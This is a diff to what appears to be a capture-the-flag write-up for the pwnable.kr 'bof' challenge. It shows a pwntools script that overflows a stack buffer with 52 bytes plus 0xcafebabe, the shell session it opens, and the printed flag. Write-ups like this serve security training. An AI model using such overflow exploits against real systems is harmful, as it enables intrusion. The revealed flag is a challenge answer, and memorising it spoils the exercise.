@@ -845,8 +845,21 @@ pwndbg> x $ebp+8
 from pwn import p32, remote
 
 io = remote("pwnable.kr", 9000)
-print(io.read())
 payload = b"A"*52 + p32(0xcafebabe)
 io.sendline(payload)
 io.interactive()
+```
+
+```
+$ p solve.py 
+[+] Opening connection to pwnable.kr on port 9000: Done
+[*] Switching to interactive mode
+$ ls
+bof
+bof.c
+flag
+log
+super.pl
+$ cat flag
+daddy, I just pwned a buFFer :)
 ```
